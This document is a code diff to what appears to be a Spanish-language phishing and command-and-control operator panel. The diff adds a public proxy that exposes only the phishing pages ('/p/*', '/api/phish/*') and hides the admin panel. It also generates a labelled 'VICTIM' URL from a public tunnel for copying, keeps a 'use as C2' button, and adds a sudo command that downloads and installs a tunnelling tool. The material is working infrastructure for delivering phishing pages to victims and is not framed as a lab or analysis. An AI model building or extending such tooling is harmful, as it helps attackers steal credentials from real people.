@@ -545,6 +545,7 @@ textarea.fi{resize:vertical;min-height:48px}
 .dep-tun-badge .tdot{width:6px;height:6px;border-radius:50%;background:#4dc8b0;box-shadow:0 0 5px rgba(77,200,176,.7)}
 .dep-card-sel{border-color:#1a4a30 !important;box-shadow:0 0 8px rgba(0,200,100,.07)}
 #tun-target-row{display:none;align-items:center;gap:8px;padding:6px 10px;background:#040e08;border:1px solid #1a3020;border-radius:3px;margin-bottom:7px;flex-wrap:wrap}
+#pub-proxy-row.active{border-color:#1a4a2a !important;background:#040e08 !important}
 </style>
 </style>
 </head>
@@ -3519,9 +3520,20 @@ textarea.fi{resize:vertical;min-height:48px}
       <span id="tun-target-name" style="font-size:11px;color:var(--txt);font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1"></span>
       <span id="tun-target-local" style="font-size:10px;color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:180px;flex-shrink:0"></span>
     </div>
-    <div id="tun-no-deploy" style="font-size:11px;color:var(--yellow);margin-bottom:6px;display:none">&#9888; Sin deploy activo &mdash; despliega un template para vincular el t&#250;nel.</div>
-    <div style="font-size:11px;color:var(--dim);margin-bottom:6px" id="tun-hint">
-      Con el sitio ya desplegado en local, elige un m&#233;todo para obtener una URL p&#250;blica y compartirla en la misma sesi&#243;n.
+    <div id="tun-no-deploy" style="font-size:11px;color:var(--yellow);margin-bottom:6px;display:none">&#9888; Sin deploy activo &mdash; despliega un template primero.</div>
+
+    <!-- Public proxy isolator -->
+    <div id="pub-proxy-row" style="display:flex;align-items:center;gap:8px;padding:7px 11px;background:#04090f;border:1px solid #0a2030;border-radius:3px;margin-bottom:7px;flex-wrap:wrap;transition:all .2s">
+      <div class="lab-srv-dot" id="pub-proxy-dot"></div>
+      <div style="flex:1;min-width:0">
+        <div id="pub-proxy-info" style="font-size:11px;color:var(--mut)">Proxy p&#250;blico detenido</div>
+        <div style="font-size:10px;color:var(--dim);margin-top:1px">&#9889; Solo expone <code style="color:var(--cyan)">/p/*</code> y <code style="color:var(--cyan)">/api/phish/*</code> &mdash; el panel admin queda privado</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:5px;flex-shrink:0">
+        <input class="fi" id="tun-proxy-port" value="8080" style="width:52px;font-size:11px;text-align:center" title="Puerto del proxy p&#250;blico (diferente al panel admin :5000)">
+        <button class="mob-tmpl-btn" id="pub-proxy-start-btn" onclick="tunManualStartProxy()" style="font-size:10px;padding:3px 9px;border-color:var(--g);color:var(--g)">&#9654; PROXY</button>
+        <button class="sbtn" id="pub-proxy-stop-btn" onclick="tunStopProxy()" style="display:none;font-size:10px;padding:3px 9px">&#9632; STOP</button>
+      </div>
     </div>
 
     <!-- Tunnel method buttons -->
@@ -3580,11 +3592,20 @@ textarea.fi{resize:vertical;min-height:48px}
         <div class="lab-srv-dot" id="tun-dot"></div>
         <span id="tun-status-text" style="font-size:12px;color:var(--mut)">Iniciando...</span>
       </div>
-      <div class="lab-url-box" id="tun-url-box" style="display:none">
-        <span>&#127760;</span>
-        <span class="lab-url-text" id="tun-public-url"></span>
-        <button class="kbtn" style="font-size:10px;padding:1px 7px;flex-shrink:0" onclick="tunCopyUrl()">&#8856; COPY</button>
-        <button class="kbtn" style="border-color:#4dc8b0;color:#4dc8b0;font-size:10px;padding:1px 7px;flex-shrink:0" onclick="tunApplyAsC2()" title="Actualiza el host del servidor C2 con esta URL">&#8656; USAR COMO C2</button>
+      <div id="tun-url-box" style="display:none;background:#010408;border:1px solid #0a2a1a;border-radius:3px;padding:7px 10px">
+        <!-- base tunnel URL -->
+        <div style="display:flex;align-items:center;gap:6px;margin-bottom:4px">
+          <span style="font-size:9px;color:var(--dim);min-width:36px;flex-shrink:0">BASE</span>
+          <span class="lab-url-text" id="tun-public-url" style="flex:1;font-size:11px"></span>
+          <button class="kbtn" style="font-size:9px;padding:1px 6px;flex-shrink:0" onclick="tunCopyUrl()">&#8856;</button>
+          <button class="kbtn" style="border-color:#4dc8b0;color:#4dc8b0;font-size:9px;padding:1px 6px;flex-shrink:0" onclick="tunApplyAsC2()" title="Usa esta URL como C2">&#8656; C2</button>
+        </div>
+        <!-- victim URL (base + /p/pageId) -->
+        <div id="tun-victim-row" style="display:none;display:flex;align-items:center;gap:6px">
+          <span style="font-size:9px;color:var(--g2);min-width:36px;flex-shrink:0">VICTIM</span>
+          <span class="lab-url-text" id="tun-victim-url" style="flex:1;font-size:11px;color:var(--g2)"></span>
+          <button class="kbtn" style="font-size:9px;padding:1px 6px;flex-shrink:0;border-color:var(--g);color:var(--g)" onclick="tunCopyVictimUrl()">&#8856; COPY</button>
+        </div>
       </div>
     </div>
 
@@ -10959,7 +10980,7 @@ var _TUN_DEPS = {
   localtunnel: { bin:'npx',
     autoInstall:'sudo apt install nodejs npm -y && npm install -g localtunnel'},
   bore:        { bin:'bore',
-    autoInstall:'curl -sL https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl.tar.gz | tar xz && sudo mv bore /usr/local/bin/'}
+    autoInstall:'BORE_URL=$(curl -s https://api.github.com/repos/ekzhang/bore/releases/latest | python3 -c "import sys,json;assets=json.load(sys.stdin)[\'assets\'];print([a[\'browser_download_url\'] for a in assets if \'x86_64-unknown-linux-musl\' in a[\'name\']][0])" 2>/dev/null) && [ -n "$BORE_URL" ] && curl -sSfL "$BORE_URL" -o /tmp/bore.tar.gz && tar -xzf /tmp/bore.tar.gz -C /tmp && sudo mv /tmp/bore /usr/local/bin/ && rm -f /tmp/bore.tar.gz || (echo "GitHub API falló, intentando con cargo..." && sudo apt-get install -y cargo && cargo install bore-cli)'}
 };
 
 var _TUN_URL_RE = {
@@ -10970,7 +10991,79 @@ var _TUN_URL_RE = {
 };
 
 function _tunPort() {
-  return (document.getElementById('phish-server-port') || {value:'5000'}).value || '5000';
+  return (document.getElementById('tun-proxy-port') || {value:'8080'}).value || '8080';
+}
+
+/* ─── Public proxy (isolates /p/* from admin panel) ─── */
+var _pubProxyRunning = false;
+
+function _tunUpdateProxyUI(running, port) {
+  var row  = document.getElementById('pub-proxy-row');
+  var dot  = document.getElementById('pub-proxy-dot');
+  var info = document.getElementById('pub-proxy-info');
+  var sBtn = document.getElementById('pub-proxy-start-btn');
+  var xBtn = document.getElementById('pub-proxy-stop-btn');
+  _pubProxyRunning = running;
+  if (row) {
+    if (running) row.classList.add('active'); else row.classList.remove('active');
+  }
+  if (dot) dot.className = 'lab-srv-dot' + (running ? ' ok' : '');
+  if (info) {
+    info.textContent = running
+      ? 'Proxy activo en :' + port + ' — admin panel bloqueado'
+      : 'Proxy público detenido';
+    info.style.color = running ? 'var(--g2)' : 'var(--mut)';
+  }
+  if (sBtn) sBtn.style.display = running ? 'none' : '';
+  if (xBtn) xBtn.style.display = running ? '' : 'none';
+}
+
+function tunManualStartProxy() {
+  var port = (document.getElementById('tun-proxy-port') || {value:'8080'}).value || '8080';
+  var sBtn = document.getElementById('pub-proxy-start-btn');
+  if (sBtn) { sBtn.disabled = true; sBtn.textContent = 'Iniciando...'; }
+  fetch(API + '/public/start', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({port: parseInt(port)})
+  })
+  .then(function(r){ return r.json(); })
+  .then(function(d){
+    if (sBtn) { sBtn.disabled = false; sBtn.textContent = '► PROXY'; }
+    if (d.error) {
+      var info = document.getElementById('pub-proxy-info');
+      if (info) { info.textContent = 'Error: ' + d.error; info.style.color = 'var(--red)'; }
+    } else {
+      _tunUpdateProxyUI(true, d.port);
+    }
+  })
+  .catch(function(e){
+    if (sBtn) { sBtn.disabled = false; sBtn.textContent = '► PROXY'; }
+  });
+}
+
+function tunStopProxy() {
+  fetch(API + '/public/stop', {method:'POST'}).catch(function(){});
+  _tunUpdateProxyUI(false, null);
+}
+
+function _tunEnsureProxy(port, cb) {
+  if (_pubProxyRunning) { cb(true); return; }
+  fetch(API + '/public/start', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({port: parseInt(port)})
+  })
+  .then(function(r){ return r.json(); })
+  .then(function(d){
+    if (d.error) { cb(false, d.error); return; }
+    _tunUpdateProxyUI(true, d.port);
+    cb(true);
+  })
+  .catch(function(e){ cb(false, String(e)); });
+}
+
+function tunCopyVictimUrl() {
+  var el = document.getElementById('tun-victim-url');
+  if (el && el.textContent) navigator.clipboard.writeText(el.textContent).catch(function(){});
 }
 
 function _tunSetActive(type) {
@@ -11002,7 +11095,17 @@ function startTunnel(type) {
       var token = localStorage.getItem(cfg.authKey) || '';
       if (!token) { _tunShowAuth(type); return; }
     }
-    _tunDoStart(type);
+    var proxyPort = (document.getElementById('tun-proxy-port') || {value:'8080'}).value || '8080';
+    _tunSetStatus('Iniciando proxy público en :' + proxyPort + '...');
+    _tunEnsureProxy(proxyPort, function(ok, err) {
+      if (!ok) {
+        _tunSetStatus('Error al iniciar proxy: ' + (err || 'puerto ocupado?'));
+        var dot = document.getElementById('tun-dot');
+        if (dot) dot.className = 'lab-srv-dot err';
+        return;
+      }
+      _tunDoStart(type);
+    });
   });
 }
 
@@ -11235,14 +11338,24 @@ function _tunSetStatus(msg, ok) {
 function _tunShowUrl(url) {
   var dot = document.getElementById('tun-dot');
   if (dot) dot.className = 'lab-srv-dot ok';
-  _tunSetStatus('Tunnel activo — URL pública detectada', true);
-  var box = document.getElementById('tun-url-box');
-  var urlEl = document.getElementById('tun-public-url');
+  // Build victim URL if we have a linked deploy with a pageId
+  var victimUrl = '';
+  var deploy = (_tunDeplIdx >= 0) ? _deployedSites[_tunDeplIdx] : null;
+  if (deploy && deploy.pageId) {
+    victimUrl = url.replace(/\/$/, '') + '/p/' + deploy.pageId;
+  }
+  _tunSetStatus('Tunnel activo' + (victimUrl ? ' — URL víctima lista' : ' — URL pública detectada'), true);
+  var box    = document.getElementById('tun-url-box');
+  var urlEl  = document.getElementById('tun-public-url');
+  var vRow   = document.getElementById('tun-victim-row');
+  var vUrlEl = document.getElementById('tun-victim-url');
   if (box) box.style.display = '';
   if (urlEl) urlEl.textContent = url;
-  // Link URL to the deploy entry
-  if (_tunDeplIdx >= 0 && _deployedSites[_tunDeplIdx]) {
-    _deployedSites[_tunDeplIdx].tunnel = { type: _tunType, publicUrl: url };
+  if (vRow)   vRow.style.display   = victimUrl ? 'flex' : 'none';
+  if (vUrlEl) vUrlEl.textContent   = victimUrl || '';
+  // Link to deploy entry
+  if (deploy) {
+    deploy.tunnel = { type: _tunType, publicUrl: victimUrl || url };
     _saveDeplSites();
     renderDeployedSites();
   }
@@ -11264,8 +11377,10 @@ function stopTunnel() {
   var btn = document.getElementById('tun-stop-btn'); if (btn) btn.disabled = true;
   document.getElementById('tun-dep-block').style.display = 'none';
   document.getElementById('tun-status-row').style.display = 'none';
+  document.getElementById('tun-url-box').style.display = 'none';
   document.getElementById('tun-out-area').style.display = 'none';
   document.getElementById('tun-ssh-block').style.display = 'none';
+  var vRow = document.getElementById('tun-victim-row'); if (vRow) vRow.style.display = 'none';
 }
 
 function showSshTunnel() {
@@ -12572,6 +12687,10 @@ bc('gd-op', bGd);
   if (lastActive >= 0) { _activeDeplIdx = lastActive; }
   renderDeployedSites();
   _renderTunTarget();
+  // Sync proxy status (server may have been restarted while proxy was running)
+  fetch(API + '/public/status').then(function(r){ return r.json(); }).then(function(d){
+    _tunUpdateProxyUI(d.running, d.port);
+  }).catch(function(){});
   _loadTgStatus();
   listsLoad();
   _loadPhishHost();
